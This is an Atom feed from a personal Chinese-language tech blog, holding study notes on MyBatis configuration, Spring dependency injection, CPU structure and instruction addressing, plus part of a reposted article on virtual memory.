<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Xorex</title>
  
  <subtitle>要成为世界上最幸福的人啊！</subtitle>
  <link href="https://xorex.space/atom.xml" rel="self"/>
  
  <link href="https://xorex.space/"/>
  <updated>2021-05-06T07:47:03.511Z</updated>
  <id>https://xorex.space/</id>
  
  <author>
    <name>Xorex</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>MyBatis 基础与配置</title>
    <link href="https://xorex.space/2022/01/01/2dfc14c136d8/"/>
    <id>https://xorex.space/2022/01/01/2dfc14c136d8/</id>
    <published>2022-01-01T11:56:51.000Z</published>
    <updated>2021-05-06T07:47:03.511Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>暂时放弃更新，等学完 MyBatis 再好好总结！！！</p></blockquote><h2 id="MyBatis-概述"><a href="#MyBatis-概述" class="headerlink" title="MyBatis 概述"></a>MyBatis 概述</h2><p>Mybatis 是一种持久层的框架，通过建立接口的方法和 XML 注册的 SQL 语句的映射关系来实现对数据库的操作。</p><h2 id="入门"><a href="#入门" class="headerlink" title="入门"></a>入门</h2><h3 id="获取数据库连接之前"><a href="#获取数据库连接之前" class="headerlink" title="获取数据库连接之前"></a>获取数据库连接之前</h3><p>首先获取数据库的连接实例 SqlSession 的连接池 SqlSessionFactory：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> SqlSessionFactory factory; <span class="comment">//连接池</span></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String resource=<span class="string">&quot;MyBatis-config.xml&quot;</span>; <span class="comment">//连接池的配置文件</span></span><br><span class="line">        InputStream inputstream = Resources.getResourceAsStream(resource); <span class="comment">//将配置文件读入流中</span></span><br><span class="line">        factory = <span class="keyword">new</span> SqlSessionFactoryBuilder().build(inputstream); <span class="comment">//按照配置文件建造 SqlSession 连接池</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> SqlSession <span class="title">getSession</span><span class="params">()</span> </span>&#123; <span class="comment">//从连接池获取连接</span></span><br><span class="line">        <span class="keyword">return</span> factory.openSession();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>获取连接池需要在服务器启动的时候进行，所以放到静态代码块里面执行。上面的 <code>SqlSessionFactoryBuilder</code> 作用就是按照配置文件建造连接池，此实例用完就扔，所以不给外部引用，让 GC 把它回收了。留着 <code>SqlSessionFactory</code> 作为单独一个连接池管理 SQL 连接。</p><h3 id="数据库连接"><a href="#数据库连接" class="headerlink" title="数据库连接"></a>数据库连接</h3><p>在 <code>MyBatis-config.xml</code> 连接池配置中加入数据库连接环境，其中 <code>&lt;property&gt;</code> 标签中的 value 中依次填入所有的信息即可。</p><p>或者外部引入一个 properties 文件，里面写上数据库连接数据，然后用 <code>$&#123;PropertyName&#125;</code> 的方式引用。</p><p>外部文件 <code>DataBase.properties</code>：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">driver</span>=<span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line"><span class="attr">url</span>=<span class="string">jdbc:mysql://localhost:3306/mybatis?useSSL=true&amp;useUnicode=true&amp;characterEncoding=utf8</span></span><br><span class="line"><span class="attr">username</span>=<span class="string">root</span></span><br><span class="line"><span class="attr">password</span>=<span class="string">123456</span></span><br></pre></td></tr></table></figure><p>然后配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span> <span class="attr">resource</span>=<span class="string">&quot;DataBase.properties&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">properties</span>&gt;</span> <span class="comment">&lt;!--引入外部的文件--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">transactionManager</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="建立-DAO-层方法和-SQL-语句的映射"><a href="#建立-DAO-层方法和-SQL-语句的映射" class="headerlink" title="建立 DAO 层方法和 SQL 语句的映射"></a>建立 DAO 层方法和 SQL 语句的映射</h3><p>DAO 层的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> </span>&#123;</span><br><span class="line">    <span class="function">List&lt;User&gt; <span class="title">getUsers</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">addUser</span><span class="params">(User user)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">updateUser</span><span class="params">(User user)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">deleteUserByUserName</span><span class="params">(String userName)</span></span>;</span><br><span class="line">    <span class="function">User <span class="title">queryUserById</span><span class="params">(Integer id)</span></span>;</span><br><span class="line">    <span class="function">User <span class="title">queryUserByUserName</span><span class="params">(String userName)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建数据库操作接口映射的 XML 文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">mapper</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;space.xorex.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getUsers&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;space.xorex.pojo.User&quot;</span>&gt;</span></span><br><span class="line">        select * from user;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意上面的 <code>namespace</code> 是下方的 SQL 语句映射的<strong>执行方法</strong>名称所在的定义空间（就是定义这些方法的接口），接口只能写完整的类名，不可以用别名。然后每一条就是执行方法映射的 SQL 语句。</p><p>对于这些映射标签，比如下面的，就一定要注意对应的接口方法名称的 参数 和 返回值，写对应的信息，而对于常见的数据类型，MyBatis 进行了别名映射，可以<strong>不区分大小写</strong>的使用这些别名。然后就是占位符的填充，使用 <code>#&#123;&#125;</code> 里面写数据名，是从 parameterType 中寻找的。</p><p>如果为 Java 设置的 Java 内置数据类型（基本数据 + String + Map + List 之类的），则使用参数名即可，比如下面的 <code>#&#123;userName&#125;</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;queryUserByUserName&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;space.xorex.pojo.User&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;string&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--这里 string 就是一个规定好的 java.lang.String 的别名--&gt;</span></span><br><span class="line">    select *</span><br><span class="line">    from user</span><br><span class="line">    where userName=#&#123;userName&#125;; <span class="tag">&lt;&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;暂时放弃更新，等学完 MyBatis 再好好总结！！！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;MyBatis-概述&quot;&gt;&lt;a href=&quot;#MyBatis-概述&quot; class=&quot;headerlink&quot; title=&quot;MyBatis 概述</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="MyBatis" scheme="https://xorex.space/tags/MyBatis/"/>
    
  </entry>
  
  <entry>
    <title>Spring 框架学习笔记</title>
    <link href="https://xorex.space/2022/01/01/d68ebc25d776/"/>
    <id>https://xorex.space/2022/01/01/d68ebc25d776/</id>
    <published>2022-01-01T09:53:05.000Z</published>
    <updated>2021-05-06T07:46:52.993Z</updated>
    
    <content type="html"><![CDATA[<h2 id="关于-Spring-框架"><a href="#关于-Spring-框架" class="headerlink" title="关于 Spring 框架"></a>关于 Spring 框架</h2><blockquote><p>暂时放弃更新，完全学完 Spring 之后再来总结。</p></blockquote><h2 id="依赖注入"><a href="#依赖注入" class="headerlink" title="依赖注入"></a>依赖注入</h2><h3 id="set-方法属性注入"><a href="#set-方法属性注入" class="headerlink" title="set 方法属性注入"></a>set 方法属性注入</h3><p>具体方法就是使用 IOC 获取到对象之后，调用对象的 setXXX() 方法设置属性。</p><h3 id="lt-property-gt-注入"><a href="#lt-property-gt-注入" class="headerlink" title="&lt;property&gt; 注入"></a>&lt;property&gt; 注入</h3><p>在 Spring 的 Bean XML 文件的 <code>&lt;bean&gt;&lt;/bean&gt;</code> 标签里面添加属性标签，<code>&lt;property&gt;</code> 标签内部有属性 name 和 value，用于设置属性值。这种方法本质上使用的是 <strong>setXXX()</strong> 方法完成的。</p><h3 id="lt-constructor-arg-gt-注入"><a href="#lt-constructor-arg-gt-注入" class="headerlink" title="&lt;constructor-arg&gt; 注入"></a>&lt;constructor-arg&gt; 注入</h3><p>在 Spring 的 Bean XML 文件的 <code>&lt;bean&gt;&lt;/bean&gt;</code> 标签里面添加属性标签，<code>&lt;constructor-arg&gt;</code> 标签内部有属性 name 和 value，用于设置属性值。这种方法本质上使用的 <strong>构造方法</strong> 完成的，使用的时候一定要检查以下所对应的构造方法是否正确。</p><h3 id="p-名称空间注入"><a href="#p-名称空间注入" class="headerlink" title="p 名称空间注入"></a>p 名称空间注入</h3><p>本质上使用 <strong>getXXX()</strong> 方法完成的，首先需要在 xml 头添加一条固定的属性：<code>xmlns:p=&quot;http://www.springframework.org/schema/p&quot;</code> 然后就可以在 <code>&lt;bean&gt;</code> 里面通过给属性 <code>p:XXX</code> 来 set 对象的属性值了（这里 XXX 为对象属性名称）。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;关于-Spring-框架&quot;&gt;&lt;a href=&quot;#关于-Spring-框架&quot; class=&quot;headerlink&quot; title=&quot;关于 Spring 框架&quot;&gt;&lt;/a&gt;关于 Spring 框架&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;暂时放弃更新，完全学完 Sprin</summary>
      
    
    
    
    <category term="开发知识" scheme="https://xorex.space/categories/%E5%BC%80%E5%8F%91%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="Spring" scheme="https://xorex.space/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>计组-中央处理器</title>
    <link href="https://xorex.space/2021/05/16/46406054684d/"/>
    <id>https://xorex.space/2021/05/16/46406054684d/</id>
    <published>2021-05-16T14:47:32.000Z</published>
    <updated>2021-05-19T03:01:04.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CPU-的主要结构"><a href="#CPU-的主要结构" class="headerlink" title="CPU 的主要结构"></a>CPU 的主要结构</h2><p>CPU 需要就有运算器和控制器两个基本的结构，这两个结构，然后完成大概下面的任务：</p><ul><li><p><strong>指令控制</strong>：完成取指令，分析指令和指令执行的操作，即程序的顺序控制。</p></li><li><p><strong>操作控制</strong>：控制产生操作信号，然后传送到所对应的部件上，让其来配合完成整条指令。</p></li><li><p><strong>时间控制</strong>：对各种操作加以时间上的控制。</p></li><li><p><strong>数据加工</strong>：对数据进行算数和逻辑运算，这里主要由运算器完成。</p></li><li><p><strong>中断处理</strong>：处理异常情况和特殊请求。</p></li></ul><h2 id="运算器-ALU-的基本结构"><a href="#运算器-ALU-的基本结构" class="headerlink" title="运算器 ALU 的基本结构"></a>运算器 ALU 的基本结构</h2><p><img src="https://xorex.space/image/255.jpg" alt="255.jpg"></p><p>里面的主要组成看上面的图片描述，下面主要说明一下，运算器的工作流程。</p><p>首先引入了一个叫作 CPU 内部总线的东西，这个东西负责整个 CPU 内部的数据传输，但是 CPU 有很多个部件，同一时间只能有一个数据信号发送方，为了防止数据传送冲突，就在每个部件上都接入一根 in 和一根 out 控制线，负责控制元器件数据信号的发送和接收。只有 in 控制线有电流，元器件才会从总线上接收数据，只有 out 控制线有电流，元器件才能将自己存储的数据传送到数据总线上去。</p><p>这样通过控制器控制对应元器件的 in 和 out 线路，实现元器通过总线的数据传输。</p><h2 id="控制器-CU-的基本结构"><a href="#控制器-CU-的基本结构" class="headerlink" title="控制器 CU 的基本结构"></a>控制器 CU 的基本结构</h2><p><img src="https://xorex.space/image/256.jpg" alt="256.jpg"></p><p>同样也是利用了 CPU 的内部总线，需要注意的是上面的 PSW，是一组程序状态字寄存器，上面的图片是有介绍的，用来记录当前程序运行所产生的特殊的状态。</p><p>因为 MAR 和 MDR 都是集成在 CPU 的内部，所以在和主存进行通信的时候，需要额外的数据总线和地址总线，用来传输信息。</p><h2 id="指令周期"><a href="#指令周期" class="headerlink" title="指令周期"></a>指令周期</h2><p><strong>时钟周期</strong> CLK，也被称为节拍，是 CPU 的最基本单位，也就是我们常用的 GHZ 单位。</p><p><strong>机器周期</strong> 是一个微指令完成的实现，由若干个时钟周期组成，如从 PC 中取出指令并送入 MAR 中为一个取址机器周期.</p><p><strong>指令周期</strong> 是通过执行若干个机器周期完成一条明确的指令所需要的时间被称为一个指令周期。</p><p><img src="https://xorex.space/image/257.jpg" alt="257.jpg"></p><p>我们将一个指令拆分成不同的周期就是为了能够利用执行不同机器周期所需要的硬件资源不同，从而实现多个指令同时执行的并行效果。要实现并行就要记录指令正在执行的机器周期，这里使用不同的触发器来记录。</p><p>就是上面的 FE IND EX INT 几种不同的触发器来记录目前的程序有什么特殊的状态。</p><h3 id="取址周期"><a href="#取址周期" class="headerlink" title="取址周期"></a>取址周期</h3><p>非常普通的一个周期，PC -&gt; MAR -&gt; 地址总线 -&gt; 内存 -&gt; 数据总线 -&gt; MDR -&gt; IR ，其中 PC 会自增。</p><h3 id="间址周期"><a href="#间址周期" class="headerlink" title="间址周期"></a>间址周期</h3><p>没啥好说的，就是多了个间址。</p><h3 id="中断周期"><a href="#中断周期" class="headerlink" title="中断周期"></a>中断周期</h3><p>中断的目的就是暂停当前正在执行的任务，转去执行其他的任务（这也是多线程的实现基础），为了恢复当前任务，会使用堆栈保存当前任务的断点，将当前的程序指令的地址（从 PC 中获取），压入堆栈中，然后通过<strong>向量地址</strong>来获取下一个程序要执行的指令的地址，将其放入 PC 中，然后继续取址执行等等。</p><h2 id="指令执行方案"><a href="#指令执行方案" class="headerlink" title="指令执行方案"></a>指令执行方案</h2><ul><li><p>单指令周期：所有指令使用相同的执行时间，只需要一个计数器数够次数即可，电路设计简单，是但是因为所有的指令使用的执行时间都是耗时最长的那个指令的执行时间，所以速度会很慢。</p></li><li><p>多指令周期：指每个不同的指令使用不同的执行时间，虽然电路设计会复杂一点，但是相较于单指令周期，整体的效率是提高了。</p></li><li><p>流水线模式：每间隔一段时间都启动一个指令的执行，让指令并行执行，效率最高，但也最难设计。（原理是指令执行的不同截断会使用不同的硬件）</p></li></ul><h2 id="数据传输方式"><a href="#数据传输方式" class="headerlink" title="数据传输方式"></a>数据传输方式</h2><ul><li>总线模式</li></ul><p>一条总线负责整个 CPU 内部的所有的数据的传输，电路设计简单，但是没有办法实现数据的并行传输，效率低。</p><p><img src="https://xorex.space/image/258.jpg" alt="258.jpg"></p><ul><li>专线模式</li></ul><p>每个部件之间的数据传输使用部件之间的专有线路，可以并行传输，效率高。</p><p><img src="https://xorex.space/image/259.jpg" alt="259.jpg"></p><h2 id="控制器-CU-设计"><a href="#控制器-CU-设计" class="headerlink" title="控制器 CU 设计"></a>控制器 CU 设计</h2><p>一般来说 CU 就是解析指令，然后根据解析的结果，像各个部件发出控制信号，指挥它们去完成指令的执行。</p><h3 id="时序脉冲发生器"><a href="#时序脉冲发生器" class="headerlink" title="时序脉冲发生器"></a>时序脉冲发生器</h3><p>时序脉冲发生器</p><p><img src="https://xorex.space/image/260.jpg" alt="260.jpg"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CPU-的主要结构&quot;&gt;&lt;a href=&quot;#CPU-的主要结构&quot; class=&quot;headerlink&quot; title=&quot;CPU 的主要结构&quot;&gt;&lt;/a&gt;CPU 的主要结构&lt;/h2&gt;&lt;p&gt;CPU 需要就有运算器和控制器两个基本的结构，这两个结构，然后完成大概下面的任务：&lt;</summary>
      
    
    
    
    <category term="计算机体系" scheme="https://xorex.space/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
    
    <category term="计算机组成原理" scheme="https://xorex.space/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>计组-指令系统</title>
    <link href="https://xorex.space/2021/05/12/53570cd3ff73/"/>
    <id>https://xorex.space/2021/05/12/53570cd3ff73/</id>
    <published>2021-05-12T13:36:40.000Z</published>
    <updated>2021-05-17T06:52:19.952Z</updated>
    
    <content type="html"><![CDATA[<h2 id="指令构成"><a href="#指令构成" class="headerlink" title="指令构成"></a>指令构成</h2><p>指令是由指令集架构定义的单个的 CPU 操作，指令包括一个操作码和地址码，操作码用来指示这条指令执行什么任务，地址码用来表示这条指令作用的对象的所在位置。</p><p>下面是对于指令的基本分析：</p><iframe src="https://www.xmind.net/embed/PNfh5B" width="800px" height="540px" frameborder="0" scrolling="no"></iframe><p>定长操作码很简单，按照指令数量的最大长度编号即可，但是地址码不是定长的，所以这样的话虽然操作码定长了，但是整体的指令不会定长。</p><p>而变长操作码，下面的图就是规划变长操作码对应不同数量的地址指令的一种方式，通过让操作码变长来适应不同长度的地址码，从而让整个指令定长：</p><p><img src="https://xorex.space/image/251.jpg" alt="251.jpg"></p><h2 id="指令寻址"><a href="#指令寻址" class="headerlink" title="指令寻址"></a>指令寻址</h2><p>指令寻址指的是 CPU 去获取指令的方式，目前来说有两种寻址模式，分别为顺序寻址和跳跃寻址。</p><p>顺序寻址：借助于 PC (Programme Counter) 不断的地址 +1 实现的，实现也很简单，只需要将所有要执行的指令按照顺序在内存中放在一起即可。</p><p>跳跃寻址：当遇到跳跃指令的时候，往往会给出要 PC 跳到的指令的地址，就需要修改 PC 里面的内容，然后跳到对应的地址读取指令。</p><h2 id="数据寻址"><a href="#数据寻址" class="headerlink" title="数据寻址"></a>数据寻址</h2><p>数据寻址方式就是指令在计算机中寻找要操作的对象的过程，有很多种：</p><p>大概的图：</p><h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><p>立即寻址指形式地址 A 表示的就是操作数本身，也就是立即数，用补码表示，常用于常量的操作。</p><p>比如 C 语言里面写 X=2+5; 那么这条代码执行背后的指令一定是使用立即寻址的，不需要去内存中寻找数据，操作码后面就跟着数据 2 和 5 ，速度相当快，只需要访问一次主存即可。</p><p>但是这样就会导致数据可表示范围大大缩小，毕竟操作码占用了不少地方。</p><h3 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h3><p>直接寻址：指的是地址码表示的就是数据在内存中的实际地址，直接按照地址码的标识去内存中找就可以拿到数据了。</p><h3 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h3><p>间接寻址：指的是地址码表示并不是数据的地址，数据地址的地址。</p><p>需要先根据地址码表示的地址从内存中拿到另外一个地址，这个地址才是数据的真实地址，所以叫作间接寻址。当然间接寻址也分间接多少次，可以是一重间接寻址，二重间接寻址等等。</p><h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><h4 id="寄存器直接寻址"><a href="#寄存器直接寻址" class="headerlink" title="寄存器直接寻址"></a>寄存器直接寻址</h4><p>和直接寻址唯一不同的就是，它的地址表示的不是内存的地址，而是寄存器的地址，这样可以以最快的数据获取想要的数据。</p><h4 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h4><p>和间接寻址唯一不同的就是，它的地址表示的不是内存的地址，而是寄存器的地址，这样可以以最快的数据获取想要的数据。</p><h3 id="隐含寻址"><a href="#隐含寻址" class="headerlink" title="隐含寻址"></a>隐含寻址</h3><p>就是可以通过操作码推断出来所需要的数据在什么地方，比如加法指令，相加是需要两个输入数的地址和结果写入的目的地址一共三个。但是因为加法器的设计就隐含了其中一个输入数就在 ACC 中，结果写入目的地址也在 ACC 中，所以因为隐含了两个的寻址，最终只需要一次寻址即可。</p><p><img src="https://xorex.space/image/252.jpg" alt="252.jpg"></p><h3 id="偏移寻址"><a href="#偏移寻址" class="headerlink" title="偏移寻址"></a>偏移寻址</h3><p>偏移寻址指的是地址码里面表示的地址都需要进行加法运算才可以获取到真正的地址，优点就是可以扩大寻址范围，并且用户不需要关心自己的实际地址在哪里，只要有相对于某个地址的偏移量即可。</p><h4 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h4><p>相对寻址，会直接在地址码的地方给出偏移量，这个偏移是相对于<strong>当前指令的下一条指令的地址</strong>做偏移的，因此会将偏移量和 PC 中的当前地址送入 ALU 中进行相加，获取真实地址。</p><p>之所以是下一条指令的地址的原因是 PC 在取出当前指令之后，会将自身的内容自动加一，所以实际上从 PC 中取出来的东西是当前执行的指令的下一条指令的地址。</p><p><img src="https://xorex.space/image/254.jpg" alt="254.jpg"></p><h4 id="基址寻址"><a href="#基址寻址" class="headerlink" title="基址寻址"></a>基址寻址</h4><p>首先先引入一个寄存器，基址寄存器（BR），里面存放的地址将作为基准地址。首先基址寻址的地址码表示一个偏移量，用补码表示，寻址的时候会将偏移量和基址寄存器一起放进 ALU 中执行加法运算。然后获取的结果作为一个内存地址去寻找操作数。</p><p>当然用通用寄存器代替基址寄存器也是可以的，那么就需要在地址码里面多加一个寄存器编号了，指明去哪个通用寄存器中寻找基本地址。</p><h4 id="改变址寻址"><a href="#改变址寻址" class="headerlink" title="改变址寻址"></a>改变址寻址</h4><p>首先引入一个寄存器，变址寄存器（IX），里面存放偏移量，而操作码里面的地址 A 表示基本地址，和 IX 里面的偏移量进行相加运算之后，获取真实地址。</p><p><img src="https://xorex.space/image/253.jpg" alt="253.jpg"></p><p>这玩意和上面的基址寻址基本相反，里面的变址寄存器是用户可控的，常用于遍历数组，将 A 作为数组首地址，不断迭代基址寄存器，就可以快速遍历整个数组了。</p><h3 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h3><p>属于隐含寻址的一部分，它隐含了地址为堆栈指针（StackPointer）的地址，没啥可讲的。</p><h2 id="CISC-和-RISC"><a href="#CISC-和-RISC" class="headerlink" title="CISC 和 RISC"></a>CISC 和 RISC</h2><p>Complex Instruction Set Computer 复杂指令集：X86。</p><p>复杂指令集的设计思路就是让一条指令执行一个复杂的任务。因此有以下特点：复杂庞大，指令不定长，不太好实现指令流水线。</p><p>Reduced Instruction Set Computer 精简指令集：RISC。</p><p>精简指令集的设计思路就是让一个复杂任务被多条指令执行。因此有以下特点：简单精简，指令定长，必须实现指令流水线。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;指令构成&quot;&gt;&lt;a href=&quot;#指令构成&quot; class=&quot;headerlink&quot; title=&quot;指令构成&quot;&gt;&lt;/a&gt;指令构成&lt;/h2&gt;&lt;p&gt;指令是由指令集架构定义的单个的 CPU 操作，指令包括一个操作码和地址码，操作码用来指示这条指令执行什么任务，地址码用来表示</summary>
      
    
    
    
    <category term="计算机体系" scheme="https://xorex.space/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB/"/>
    
    
    <category term="计算机组成原理" scheme="https://xorex.space/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>计组-深入虚拟内存</title>
    <link href="https://xorex.space/2021/05/12/d1cccaf324ae/"/>
    <id>https://xorex.space/2021/05/12/d1cccaf324ae/</id>
    <published>2021-05-12T13:36:22.000Z</published>
    <updated>2021-05-12T14:31:37.407Z</updated>
    
    <content type="html"><![CDATA[<ul><li>本文转自与 知乎-安佳玮 <a href="https://zhuanlan.zhihu.com/p/61587598">深入虚拟内存（Virtual Memory，VM）</a></li></ul><p>我们应该知道<strong>物理内存（Physical Memory）</strong>指的是硬件上的内存，即 RAM。它通常指的是插在主板上的内存条，给进程提供临时数据存储的设备。因为 CPU 可以直接从物理内存中读取数据和指令，所以物理内存又叫做主存。</p><p><strong>虚拟内存（virtual memory，VM）</strong>又叫做虚拟存储 **（virtual storage)**，是一种内存管理技术。它是操作系统提供的一种对主存的抽象。虚拟内存的实现由操作系统软件和硬件结合完成，包括硬件异常、地址翻译、磁盘文件、内核程序等。</p><p>本文将深入虚拟内存的实现机制，讨论它是怎么将磁盘和主存结合共同提供这种抽象的。</p><h2 id="虚拟内存解决了什么问题？"><a href="#虚拟内存解决了什么问题？" class="headerlink" title="虚拟内存解决了什么问题？"></a>虚拟内存解决了什么问题？</h2><p>1）虚拟内存给进程提供了一个更大的内存空间，不再受物理内存大小的限制。它将物理内存看作是存储在磁盘上的地址空间的缓存。 现在的电脑好一点的差不多就是 16GB 或者 32GB 的内存，而且内存越大，肯定就越贵。那如果只有物理内存，在很多情况下根本不够用，特别是需要运行很多程序的情况下。而磁盘空间相对来说是很便宜的，即使是 SSD，在同样的容积下也便宜太多了。虚拟内存技术在主存中只保留活动区域，然后根据需要在磁盘和主存之间来回传送数据，这样，它就可以更加高效的利用主存。</p><p>2）虚拟内存为程序提供内存管理。我们在敲代码的时候，不需要考虑这个变量会不会被其它程序错误的修改。因为虚拟内存帮我们做了这些事情，它给程序提供了内存隔离，为程序提供了安全的共享物理内存的途径。使得每个进程的地址空间不会被其它进程破坏。 